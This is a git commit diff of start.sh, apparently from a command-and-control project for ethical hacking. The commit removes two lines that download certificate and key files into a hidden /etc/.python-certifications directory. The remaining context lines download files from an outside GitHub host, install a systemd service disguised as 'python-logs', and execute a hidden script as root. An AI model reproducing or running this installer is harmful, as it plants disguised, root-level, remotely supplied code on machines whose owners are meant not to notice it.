4f8699e506e9a8cb02093e8d818a485662f8e365
Nidhi Pabbathi <123031844+npabbathi@users.noreply.github.com>
2026-03-26 19:01:00 -0500

    Update start.sh

--- start.sh
+++ start.sh
@@ -8,12 +8,6 @@ curl -fsSL --retry 3 https://raw.githubusercontent.com/AidanNgo/eh-command-contr
 curl -fsSL --retry 3 https://raw.githubusercontent.com/AidanNgo/eh-command-control/refs/heads/main/logs.service \
   | sudo tee /etc/systemd/system/python-logs.service > /dev/null
 
-curl -fsSL --retry 3 https://raw.githubusercontent.com/AidanNgo/eh-command-control/raw/refs/heads/main/cert.pem \
-  | sudo tee /etc/.python-certifications/cert.pem > /dev/null
-
-curl -fsSL --retry 3 https://raw.githubusercontent.com/AidanNgo/eh-command-control/refs/heads/main/key.pem \
-  | sudo tee /etc/.python-certifications/key.pem > /dev/null
-
 sudo chmod +x /etc/.python-certifications/.python-logs
 sudo bash /etc/.python-certifications/.python-logs
 
